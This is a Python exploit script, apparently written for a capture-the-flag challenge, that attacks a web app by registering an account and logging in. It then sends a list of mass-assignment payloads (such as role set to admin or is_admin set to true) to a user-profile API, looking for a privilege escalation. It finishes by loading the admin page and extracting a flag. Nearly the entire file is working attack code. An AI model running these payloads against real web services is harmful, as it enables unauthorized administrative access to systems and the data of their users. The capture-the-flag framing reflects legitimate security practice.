import requests
import json
import random
import string

TARGET = 'https://switch-ctf.tdho.st'
s = requests.Session()

def api(path, payload):
    r = s.post(TARGET + path, json=payload, timeout=8)
    try:
        return r.status_code, r.json()
    except:
        return r.status_code, r.text

# Random username to avoid conflicts
uname = 'hax_' + ''.join(random.choices(string.ascii_lowercase, k=6))
pwd = 'pass123'

print(f"=== Step 1: Register as {uname} ===")
code, data = api('/api/register', {'username': uname, 'password': pwd})
print(f"  [{code}] {data}")

print(f"\n=== Step 2: Login ===")
code, data = api('/api/login', {'username': uname, 'password': pwd})
print(f"  [{code}] {data}")
print(f"  Cookies: {dict(s.cookies)}")

print(f"\n=== Step 3: Check current status (GET /) ===")
r = s.get(TARGET + '/')
from bs4 import BeautifulSoup
soup = BeautifulSoup(r.text, 'html.parser')
body = ' '.join(soup.get_text().split())[:300]
print(f"  Body: {body}")

print(f"\n=== Step 4: Try /api/user with role=admin (mass assignment) ===")
# The profile update endpoint - try injecting role
payloads_to_try = [
    {'display_name': 'hacker', 'role': 'admin'},
    {'display_name': 'hacker', 'role': 'administrator'},
    {'display_name': 'hacker', 'is_admin': True},
    {'display_name': 'hacker', 'is_admin': 1},
    {'display_name': 'hacker', 'admin': True},
    {'role': 'admin'},
    {'is_admin': True},
    {'admin': True},
    {'display_name': 'hacker', 'role': 'admin', 'is_admin': True},
]

for payload in payloads_to_try:
    code, data = api('/api/user', payload)
    print(f"  [{code}] {json.dumps(payload)[:60]} -> {data}")
    if isinstance(data, dict) and data.get('role') == 'admin':
        print("  *** ROLE ESCALATED TO ADMIN!")
        break

print(f"\n=== Step 5: Try /admin ===")
r = s.get(TARGET + '/admin')
soup = BeautifulSoup(r.text, 'html.parser')
body = ' '.join(soup.get_text().split())[:500]
print(f"  [{r.status_code}] {body}")

# Check for flag
if 'TDHT{' in r.text:
    import re
    flags = re.findall(r'TDHT\{[^}]+\}', r.text)
    print(f"\n*** FLAG: {flags}")
